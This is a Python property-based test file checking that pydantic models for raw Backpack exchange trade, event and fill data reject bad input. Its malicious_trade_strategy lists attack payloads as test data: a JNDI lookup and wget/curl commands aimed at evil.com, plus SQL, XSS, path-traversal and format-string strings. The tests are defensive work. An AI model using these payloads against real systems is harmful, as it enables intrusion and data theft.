"""Property-based tests for Backpack raw trade models.

These tests validate critical security boundary models that process external trading data.
The models tested here are essential for trade execution, fill processing, and market data.

SECURITY CRITICAL: These raw models protect against:
- Malicious trade data that could manipulate trading calculations
- Financial precision errors in price and quantity processing
- Buffer overflow attacks through oversized trade identifiers
- Injection attacks through symbol and order ID manipulation
- Timestamp manipulation that could affect trade sequencing
- Boolean manipulation affecting maker/taker determination

Property testing ensures comprehensive coverage of trading edge cases and adversarial inputs.
"""

from decimal import Decimal
from typing import Any

import pytest
from hypothesis import given, strategies as st, assume
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.backpack.models.bp_raw_fills import (
    BackpackRawFillResponse,
)
from cyberdelta.apis.backpack.models.bp_raw_trade import (
    BackpackRawPublicTrade,
    BackpackRawPublicTradeEvent,
    BackpackRawRecentPublicTrade,
)
from cyberdelta.apis.exceptions.field_validation import DecimalFiniteError
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import (
    DateTimeParsingError,
    EmptyStringError,
    TimestampFormatError,
)


# =============================================================================
# HYPOTHESIS STRATEGIES FOR TRADE MODEL TESTING
# =============================================================================


def trade_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for trade financial fields."""
    return st.one_of([
        # Trading price/quantity amounts
        st.decimals(min_value=Decimal("0"), max_value=Decimal("10000000"), places=8).map(str),
        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000"), places=6).map(str),
        # Common trading values
        st.just("0"),
        st.just("0.0"),
        st.just("0.01"),  # Minimum tick
        st.just("50000.00"),  # BTC price
        st.just("0.00000001"),  # Minimum precision
        st.just("999999.99999999"),  # Large price
        # Scientific notation (valid for decimal parsing)
        st.just("1e6"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def trading_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid trading symbol strings."""
    return st.one_of([
        # Common trading pairs
        st.sampled_from(["BTC_USDC", "ETH_USDC", "SOL_USDC", "AVAX_USDC", "ARB_USDC"]),
        # Valid symbol formats
        st.text(
            min_size=3,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
            ),
        ).filter(lambda x: "_" in x and len(x.encode("utf-8")) <= 64),
        # Edge cases
        st.text(min_size=1, max_size=64).filter(
            lambda x: x.strip() and len(x.encode("utf-8")) <= 64
        ),
    ])


def trade_id_strategy() -> SearchStrategy[str]:
    """Generate valid trade ID strings."""
    return st.one_of([
        # Common formats
        st.text(
            min_size=1,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
            ),
        ),
        # Typical patterns
        st.just("trade_123456"),
        st.just("trade_abc123def"),
        st.just("bp_trade_789xyz"),
        # UUID-like
        st.uuids().map(str),
        # Numeric IDs
        st.integers(min_value=1, max_value=999999999999).map(str),
        # Edge cases
        st.text(min_size=1, max_size=64).filter(
            lambda x: x.strip() and len(x.encode("utf-8")) <= 64
        ),
    ])


def order_id_strategy() -> SearchStrategy[str]:
    """Generate valid order ID strings."""
    return st.one_of([
        # Common formats
        st.text(
            min_size=1,
            max_size=128,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
            ),
        ),
        # Typical patterns
        st.just("order_123456"),
        st.just("order_abc123def"),
        st.just("bp_order_789xyz"),
        # UUID-like
        st.uuids().map(str),
        # Edge cases
        st.text(min_size=1, max_size=128).filter(
            lambda x: x.strip() and len(x.encode("utf-8")) <= 128
        ),
    ])


def timestamp_strategy() -> SearchStrategy[Any]:
    """Generate valid timestamp values."""
    return st.one_of([
        # Unix timestamps (milliseconds)
        st.integers(min_value=1000000000000, max_value=2000000000000),
        # Unix timestamps (seconds)
        st.integers(min_value=1000000000, max_value=2000000000),
        # Float timestamps
        st.floats(
            min_value=1000000000.0, max_value=2000000000.0, allow_nan=False, allow_infinity=False
        ),
        # ISO format strings
        st.just("2023-03-15T12:00:00Z"),
        st.just("2024-01-01T00:00:00.000Z"),
        # String timestamps
        st.integers(min_value=1000000000000, max_value=2000000000000).map(str),
    ])


def side_strategy() -> SearchStrategy[str]:
    """Generate valid order side strings."""
    return st.sampled_from(["Bid", "Ask"])


def fee_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid fee symbol strings."""
    return st.one_of([
        # Common fee symbols
        st.sampled_from(["USDC", "USDT", "BTC", "ETH", "SOL"]),
        # Valid formats
        st.text(
            min_size=2, max_size=32, alphabet=st.characters(whitelist_categories=["Lu", "Ll", "Nd"])
        ),
        # Edge cases
        st.text(min_size=1, max_size=32).filter(
            lambda x: x.strip() and len(x.encode("utf-8")) <= 32
        ),
    ])


@st.composite
def valid_public_trade_data(draw) -> dict[str, Any]:
    """Generate valid public trade data structure."""
    return {
        "id": draw(trade_id_strategy()),
        "orderId": draw(order_id_strategy()),
        "symbol": draw(trading_symbol_strategy()),
        "price": draw(trade_decimal_strategy()),
        "qty": draw(trade_decimal_strategy()),
        "time": draw(timestamp_strategy()),
    }


@st.composite
def valid_recent_public_trade_data(draw) -> dict[str, Any]:
    """Generate valid recent public trade data structure."""
    return {
        "id": draw(st.integers(min_value=0, max_value=2**31 - 1)),
        "isBuyerMaker": draw(st.booleans()),
        "price": draw(trade_decimal_strategy()),
        "quantity": draw(trade_decimal_strategy()),
        "quoteQuantity": draw(trade_decimal_strategy()),
        "timestamp": draw(timestamp_strategy()),
    }


@st.composite
def valid_trade_event_data(draw) -> dict[str, Any]:
    """Generate valid trade event data structure."""
    return {
        "e": "trade",
        "E": draw(timestamp_strategy()),
        "s": draw(trading_symbol_strategy()),
        "p": draw(trade_decimal_strategy()),
        "q": draw(trade_decimal_strategy()),
        "b": draw(order_id_strategy()),
        "a": draw(order_id_strategy()),
        "t": draw(trade_id_strategy()),
        "T": draw(timestamp_strategy()),
        "m": draw(st.booleans()),
    }


@st.composite
def valid_fill_response_data(draw) -> dict[str, Any]:
    """Generate valid fill response data structure."""
    return {
        "fee": draw(trade_decimal_strategy()),
        "feeSymbol": draw(fee_symbol_strategy()),
        "isMaker": draw(st.booleans()),
        "orderId": draw(order_id_strategy()),
        "price": draw(trade_decimal_strategy()),
        "quantity": draw(trade_decimal_strategy()),
        "side": draw(side_strategy()),
        "symbol": draw(trading_symbol_strategy()),
        "timestamp": draw(
            st.one_of([
                st.just("2024-01-01T00:00:00.000Z"),
                st.just("2023-12-31T23:59:59.999Z"),
                st.just("2024-05-01T12:34:56.789000Z"),
            ])
        ),
        "tradeId": draw(st.integers(min_value=0, max_value=2**31 - 1)),
        "clientId": draw(
            st.one_of([
                st.none(),
                order_id_strategy(),
            ])
        ),
    }


def malicious_trade_strategy() -> SearchStrategy[Any]:
    """Generate malicious strings for trade security testing."""
    return st.one_of([
        # Financial manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-trades}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('trade-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE trades;--"),
        st.just("1' UNION SELECT * FROM orders--"),
        # Buffer overflow attempts
        st.text(min_size=10000, max_size=50000),
        st.just("T" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.trades.find(); //"),
        # JSON injection
        st.just('{"$where": "this.price > 1000000"}'),
        # Trade manipulation
        st.just("BTC_USDC'; UPDATE trades SET price=0;--"),
    ])


def invalid_trade_type_strategy() -> SearchStrategy[Any]:
    """Generate invalid types for trade field validation testing."""
    return st.one_of([
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
        # Complex nested structures
        st.lists(st.dictionaries(st.text(), st.integers())),
        st.dictionaries(st.text(), st.lists(st.text())),
    ])


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW PUBLIC TRADE MODEL
# =============================================================================


class TestBackpackRawPublicTradeProperties:
    """Property-based tests for BackpackRawPublicTrade validation and security."""

    @given(trade_data=valid_public_trade_data())
    def test_public_trade_validation_success_properties(self, trade_data: dict[str, Any]) -> None:
        """Property: Valid trade data should always create valid BackpackRawPublicTrade objects."""
        # Skip invalid decimal values
        try:
            price_val = Decimal(trade_data["price"])
            qty_val = Decimal(trade_data["qty"])
            assume(price_val.is_finite() and qty_val.is_finite())
            assume(price_val >= 0 and qty_val >= 0)  # Non-negative constraint
        except (ValueError, TypeError):
            assume(False)

        # Skip empty or invalid strings
        assume(trade_data["id"].strip())
        assume(trade_data["orderId"].strip())
        assume(trade_data["symbol"].strip())

        obj = BackpackRawPublicTrade.model_validate(trade_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawPublicTrade)

        # Property: All fields should be preserved
        assert obj.id == trade_data["id"]
        assert obj.order_id == trade_data["orderId"]
        assert obj.symbol == trade_data["symbol"]
        assert obj.price == trade_data["price"]
        assert obj.quantity == trade_data["qty"]

        # Property: Decimal fields should be parseable as finite decimals
        assert Decimal(obj.price).is_finite()
        assert Decimal(obj.quantity).is_finite()

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(
        field_name=st.sampled_from(["id", "orderId", "symbol", "price", "qty"]),
        malicious_value=malicious_trade_strategy(),
    )
    def test_public_trade_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Public trade model should reject malicious inputs safely."""
        base_data = {
            "id": "trade_123",
            "orderId": "order_456",
            "symbol": "BTC_USDC",
            "price": "50000.00",
            "qty": "0.01",
            "time": 1678886400000,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            DecimalFiniteError,
            DateTimeParsingError,
            TimestampFormatError,
        )):
            BackpackRawPublicTrade.model_validate(base_data)

    @given(
        field_name=st.sampled_from(["id", "orderId", "symbol", "price", "time"]),
        invalid_value=invalid_trade_type_strategy(),
    )
    def test_public_trade_type_safety_properties(self, field_name: str, invalid_value: Any) -> None:
        """Property: Public trade model should enforce strict type safety."""
        base_data = {
            "id": "trade_123",
            "orderId": "order_456",
            "symbol": "BTC_USDC",
            "price": "50000.00",
            "qty": "0.01",
            "time": 1678886400000,
        }
        base_data[field_name] = invalid_value

        # Property: Wrong types should be rejected
        with pytest.raises((ValidationError, TypeError)):
            BackpackRawPublicTrade.model_validate(base_data)

    @given(
        decimal_field=st.sampled_from(["price", "qty"]),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0"),
            st.just("1000.50"),
            st.just("1e6"),
            st.just("2.5e-4"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ]),
    )
    def test_public_trade_decimal_validation_properties(
        self, decimal_field: str, decimal_value: str
    ) -> None:
        """Property: Public trade decimal fields should validate properly."""
        trade_data = {
            "id": "trade_123",
            "orderId": "order_456",
            "symbol": "BTC_USDC",
            "price": "50000.00",
            "qty": "0.01",
            "time": 1678886400000,
        }
        trade_data[decimal_field] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()

            if is_finite and not is_empty:
                # Property: Valid finite decimals should be accepted
                obj = BackpackRawPublicTrade.model_validate(trade_data)
                assert getattr(obj, decimal_field.replace("qty", "quantity")) == decimal_value
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, DecimalFiniteError)):
                    BackpackRawPublicTrade.model_validate(trade_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                BackpackRawPublicTrade.model_validate(trade_data)


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW RECENT PUBLIC TRADE MODEL
# =============================================================================


class TestBackpackRawRecentPublicTradeProperties:
    """Property-based tests for BackpackRawRecentPublicTrade validation and security."""

    @given(trade_data=valid_recent_public_trade_data())
    def test_recent_trade_validation_success_properties(self, trade_data: dict[str, Any]) -> None:
        """Property: Valid recent trade data should always create valid objects."""
        # Skip invalid decimal values
        try:
            for field in ["price", "quantity", "quoteQuantity"]:
                decimal_val = Decimal(trade_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip invalid IDs
        assume(isinstance(trade_data["id"], int) and trade_data["id"] >= 0)

        obj = BackpackRawRecentPublicTrade.model_validate(trade_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawRecentPublicTrade)

        # Property: All fields should be preserved
        assert obj.id == trade_data["id"]
        assert obj.is_buyer_maker == trade_data["isBuyerMaker"]
        assert obj.price == trade_data["price"]
        assert obj.quantity == trade_data["quantity"]
        assert obj.quote_quantity == trade_data["quoteQuantity"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW PUBLIC TRADE EVENT MODEL
# =============================================================================


class TestBackpackRawPublicTradeEventProperties:
    """Property-based tests for BackpackRawPublicTradeEvent validation and security."""

    @given(event_data=valid_trade_event_data())
    def test_trade_event_validation_success_properties(self, event_data: dict[str, Any]) -> None:
        """Property: Valid trade event data should always create valid objects."""
        # Skip invalid decimal values
        try:
            price_val = Decimal(event_data["p"])
            qty_val = Decimal(event_data["q"])
            assume(price_val.is_finite() and qty_val.is_finite())
            assume(price_val >= 0 and qty_val >= 0)  # Non-negative constraint
        except (ValueError, TypeError):
            assume(False)

        # Skip empty strings
        assume(event_data["s"].strip())
        assume(event_data["b"].strip())
        assume(event_data["a"].strip())
        assume(event_data["t"].strip())

        obj = BackpackRawPublicTradeEvent.model_validate(event_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawPublicTradeEvent)

        # Property: Event type should be literal
        assert obj.event_type == "trade"

        # Property: All fields should be preserved
        assert obj.symbol == event_data["s"]
        assert obj.price == event_data["p"]
        assert obj.quantity == event_data["q"]
        assert obj.buyer_order_id == event_data["b"]
        assert obj.seller_order_id == event_data["a"]
        assert obj.trade_id == event_data["t"]
        assert obj.is_buyer_the_maker == event_data["m"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["e", "s", "p", "q", "b", "a", "t", "m"]),
        malicious_value=malicious_trade_strategy(),
    )
    def test_trade_event_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Trade event model should reject malicious inputs safely."""
        base_data = {
            "e": "trade",
            "E": 1678886400000,
            "s": "BTC_USDC",
            "p": "50000.00",
            "q": "0.01",
            "b": "buyer_order",
            "a": "seller_order",
            "t": "trade_123",
            "T": 1678886400100,
            "m": True,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            DecimalFiniteError,
            DateTimeParsingError,
            TimestampFormatError,
        )):
            BackpackRawPublicTradeEvent.model_validate(base_data)

    @given(invalid_event=st.text().filter(lambda x: x != "trade"))
    def test_trade_event_type_validation_properties(self, invalid_event: str) -> None:
        """Property: Trade event type should be validated as literal."""
        event_data = {
            "e": invalid_event,
            "E": 1678886400000,
            "s": "BTC_USDC",
            "p": "50000.00",
            "q": "0.01",
            "b": "buyer_order",
            "a": "seller_order",
            "t": "trade_123",
            "T": 1678886400100,
            "m": True,
        }

        # Property: Invalid event types should be rejected
        if not invalid_event.strip():
            with pytest.raises(EmptyStringError):
                BackpackRawPublicTradeEvent.model_validate(event_data)
        else:
            with pytest.raises(ValidationError) as exc_info:
                BackpackRawPublicTradeEvent.model_validate(event_data)
            # Property: Error should indicate invalid literal value
            error_msg = str(exc_info.value)
            assert "Input should be 'trade'" in error_msg or "Invalid value" in error_msg


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW FILL RESPONSE MODEL
# =============================================================================


class TestBackpackRawFillResponseProperties:
    """Property-based tests for BackpackRawFillResponse validation and security."""

    @given(fill_data=valid_fill_response_data())
    def test_fill_response_validation_success_properties(self, fill_data: dict[str, Any]) -> None:
        """Property: Valid fill data should always create valid BackpackRawFillResponse objects."""
        # Skip invalid decimal values
        try:
            for field in ["fee", "price", "quantity"]:
                decimal_val = Decimal(fill_data[field])
                assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip empty or invalid strings
        assume(fill_data["feeSymbol"].strip())
        assume(fill_data["orderId"].strip())
        assume(fill_data["symbol"].strip())
        assume(fill_data["side"] in {"Bid", "Ask"})
        assume(isinstance(fill_data["tradeId"], int) and fill_data["tradeId"] >= 0)

        # Skip invalid client IDs
        if fill_data["clientId"] is not None:
            assume(fill_data["clientId"].strip())

        obj = BackpackRawFillResponse.model_validate(fill_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawFillResponse)

        # Property: All fields should be preserved
        assert obj.fee == fill_data["fee"]
        assert obj.fee_symbol == fill_data["feeSymbol"]
        assert obj.is_maker == fill_data["isMaker"]
        assert obj.order_id == fill_data["orderId"]
        assert obj.price == fill_data["price"]
        assert obj.quantity == fill_data["quantity"]
        assert obj.side == fill_data["side"]
        assert obj.symbol == fill_data["symbol"]
        assert obj.timestamp == fill_data["timestamp"]
        assert obj.trade_id == fill_data["tradeId"]
        assert obj.client_id == fill_data["clientId"]

        # Property: Decimal fields should be parseable as finite decimals
        assert Decimal(obj.fee).is_finite()
        assert Decimal(obj.price).is_finite()
        assert Decimal(obj.quantity).is_finite()

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from([
            "fee",
            "feeSymbol",
            "orderId",
            "price",
            "quantity",
            "side",
            "symbol",
        ]),
        malicious_value=malicious_trade_strategy(),
    )
    def test_fill_response_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Fill response model should reject malicious inputs safely."""
        base_data = {
            "fee": "0.001",
            "feeSymbol": "USDC",
            "isMaker": True,
            "orderId": "order_123",
            "price": "50000.00",
            "quantity": "0.01",
            "side": "Bid",
            "symbol": "BTC_USDC",
            "timestamp": "2024-01-01T00:00:00.000Z",
            "tradeId": 123456789,
            "clientId": "client_abc",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            DecimalFiniteError,
        )):
            BackpackRawFillResponse.model_validate(base_data)

    @given(invalid_side=st.text().filter(lambda x: x not in {"Bid", "Ask"}))
    def test_fill_response_side_validation_properties(self, invalid_side: str) -> None:
        """Property: Fill response side should be validated properly."""
        fill_data = {
            "fee": "0.001",
            "feeSymbol": "USDC",
            "isMaker": True,
            "orderId": "order_123",
            "price": "50000.00",
            "quantity": "0.01",
            "side": invalid_side,
            "symbol": "BTC_USDC",
            "timestamp": "2024-01-01T00:00:00.000Z",
            "tradeId": 123456789,
            "clientId": "client_abc",
        }

        # Property: Invalid sides should be rejected
        if not invalid_side.strip():
            with pytest.raises(EmptyStringError):
                BackpackRawFillResponse.model_validate(fill_data)
        else:
            with pytest.raises(ValidationError) as exc_info:
                BackpackRawFillResponse.model_validate(fill_data)
            # Property: Error should indicate invalid enum value
            error_msg = str(exc_info.value)
            assert "Invalid value" in error_msg or "Input should be" in error_msg

    @given(
        client_id_value=st.one_of([
            st.just(""),  # Empty string
            st.just("   "),  # Whitespace only
            st.just("\t\n"),  # Other whitespace
        ])
    )
    def test_fill_response_client_id_validation_properties(self, client_id_value: str) -> None:
        """Property: Fill response client ID should reject empty strings."""
        fill_data = {
            "fee": "0.001",
            "feeSymbol": "USDC",
            "isMaker": True,
            "orderId": "order_123",
            "price": "50000.00",
            "quantity": "0.01",
            "side": "Bid",
            "symbol": "BTC_USDC",
            "timestamp": "2024-01-01T00:00:00.000Z",
            "tradeId": 123456789,
            "clientId": client_id_value,
        }

        # Property: Empty client IDs should be rejected
        with pytest.raises(EmptyStringError) as exc_info:
            BackpackRawFillResponse.model_validate(fill_data)
        # Property: Error should mention client ID validation
        error_msg = str(exc_info.value)
        assert "clientId cannot be an empty or whitespace-only string if provided" in error_msg


# =============================================================================
# INTEGRATION PROPERTY TESTS
# =============================================================================


class TestBackpackRawTradeIntegrationProperties:
    """Integration property tests for all trade models."""

    @given(
        public_trade_data=valid_public_trade_data(),
        trade_event_data=valid_trade_event_data(),
        fill_data=valid_fill_response_data(),
    )
    def test_trade_models_consistency_properties(
        self,
        public_trade_data: dict[str, Any],
        trade_event_data: dict[str, Any],
        fill_data: dict[str, Any],
    ) -> None:
        """Property: All trade models should have consistent validation behavior."""
        # Filter to valid inputs only
        try:
            # Validate public trade decimals
            Decimal(public_trade_data["price"])
            Decimal(public_trade_data["qty"])

            # Validate event decimals
            Decimal(trade_event_data["p"])
            Decimal(trade_event_data["q"])

            # Validate fill decimals
            Decimal(fill_data["fee"])
            Decimal(fill_data["price"])
            Decimal(fill_data["quantity"])

        except (ValueError, TypeError):
            assume(False)

        assume(public_trade_data["symbol"].strip())
        assume(trade_event_data["s"].strip())
        assume(fill_data["symbol"].strip())
        assume(fill_data["side"] in {"Bid", "Ask"})

        # Skip invalid client IDs
        if fill_data["clientId"] is not None:
            assume(fill_data["clientId"].strip())

        # Property: All models should validate successfully with valid data
        public_trade_obj = BackpackRawPublicTrade.model_validate(public_trade_data)
        trade_event_obj = BackpackRawPublicTradeEvent.model_validate(trade_event_data)
        fill_obj = BackpackRawFillResponse.model_validate(fill_data)

        # Property: All should have consistent model configuration
        assert public_trade_obj.model_config.get("extra") == "forbid"
        assert trade_event_obj.model_config.get("extra") == "forbid"
        assert fill_obj.model_config.get("extra") == "forbid"
        assert public_trade_obj.model_config.get("frozen") is True
        assert trade_event_obj.model_config.get("frozen") is True
        assert fill_obj.model_config.get("frozen") is True

    @given(
        malicious_data=st.dictionaries(
            st.sampled_from([
                "id",
                "orderId",
                "symbol",
                "price",
                "qty",
                "s",
                "p",
                "q",
                "fee",
                "side",
            ]),
            malicious_trade_strategy(),
        )
    )
    def test_trade_models_security_boundary_properties(
        self, malicious_data: dict[str, Any]
    ) -> None:
        """Property: All trade models should consistently reject malicious inputs."""
        # Try to validate as public trade if it has public trade fields
        if "id" in malicious_data or "orderId" in malicious_data or "price" in malicious_data:
            public_trade_data = {
                "id": malicious_data.get("id", "trade_123"),
                "orderId": malicious_data.get("orderId", "order_456"),
                "symbol": malicious_data.get("symbol", "BTC_USDC"),
                "price": malicious_data.get("price", "50000.00"),
                "qty": malicious_data.get("qty", "0.01"),
                "time": 1678886400000,
            }

            # Property: Malicious public trade data should be rejected
            with pytest.raises((
                ValidationError,
                TypeError,
                EmptyStringError,
                TypeFieldError,
                DecimalFiniteError,
            )):
                BackpackRawPublicTrade.model_validate(public_trade_data)

        # Try to validate as trade event if it has event fields
        if "s" in malicious_data or "p" in malicious_data or "q" in malicious_data:
            event_data = {
                "e": "trade",
                "E": 1678886400000,
                "s": malicious_data.get("s", "BTC_USDC"),
                "p": malicious_data.get("p", "50000.00"),
                "q": malicious_data.get("q", "0.01"),
                "b": "buyer_order",
                "a": "seller_order",
                "t": "trade_123",
                "T": 1678886400100,
                "m": True,
            }

            # Property: Malicious event data should be rejected
            with pytest.raises((ValidationError, TypeError, EmptyStringError, DecimalFiniteError)):
                BackpackRawPublicTradeEvent.model_validate(event_data)

        # Try to validate as fill response if it has fill fields
        if "fee" in malicious_data or "side" in malicious_data:
            fill_data = {
                "fee": malicious_data.get("fee", "0.001"),
                "feeSymbol": "USDC",
                "isMaker": True,
                "orderId": malicious_data.get("orderId", "order_123"),
                "price": malicious_data.get("price", "50000.00"),
                "quantity": "0.01",
                "side": malicious_data.get("side", "Bid"),
                "symbol": malicious_data.get("symbol", "BTC_USDC"),
                "timestamp": "2024-01-01T00:00:00.000Z",
                "tradeId": 123456789,
                "clientId": "client_abc",
            }

            # Property: Malicious fill data should be rejected
            with pytest.raises((ValidationError, TypeError, EmptyStringError, DecimalFiniteError)):
                BackpackRawFillResponse.model_validate(fill_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_BackpackRawPublicTrade_real_world_example() -> None:
    """Test with real-world trading data."""
    payload = {
        "id": "trade_001",
        "orderId": "order_abc",
        "symbol": "BTC_USDC",
        "price": "50000.00",
        "qty": "0.01",
        "time": 1678886400000,
    }
    obj = BackpackRawPublicTrade.model_validate(payload)
    assert obj.id == "trade_001"
    assert obj.order_id == "order_abc"
    assert obj.symbol == "BTC_USDC"
    assert obj.price == "50000.00"
    assert obj.quantity == "0.01"
    assert obj.time == 1678886400000


def test_BackpackRawPublicTradeEvent_real_world_example() -> None:
    """Test with real-world trade event data."""
    payload = {
        "e": "trade",
        "E": 1678886400000,
        "s": "ETH_USDC",
        "p": "1650.50",
        "q": "1.5",
        "b": "buyer_order_123",
        "a": "seller_order_456",
        "t": "trade_789",
        "T": 1678886400100,
        "m": True,
    }
    obj = BackpackRawPublicTradeEvent.model_validate(payload)
    assert obj.event_type == "trade"
    assert obj.symbol == "ETH_USDC"
    assert obj.price == "1650.50"
    assert obj.quantity == "1.5"
    assert obj.is_buyer_the_maker is True


def test_BackpackRawFillResponse_real_world_example() -> None:
    """Test with real-world fill response data."""
    payload = {
        "fee": "0.005",
        "feeSymbol": "USDC",
        "isMaker": True,
        "orderId": "order_123456789",
        "price": "50000.12345",
        "quantity": "0.002",
        "side": "Bid",
        "symbol": "BTC_USDC",
        "timestamp": "2024-05-01T12:34:56.789000Z",
        "tradeId": 987654321,
        "clientId": "client_abc_def_999",
    }
    obj = BackpackRawFillResponse.model_validate(payload)
    assert obj.fee == "0.005"
    assert obj.fee_symbol == "USDC"
    assert obj.is_maker is True
    assert obj.order_id == "order_123456789"
    assert obj.price == "50000.12345"
    assert obj.quantity == "0.002"
    assert obj.side == "Bid"
    assert obj.symbol == "BTC_USDC"
    assert obj.trade_id == 987654321
    assert obj.client_id == "client_abc_def_999"
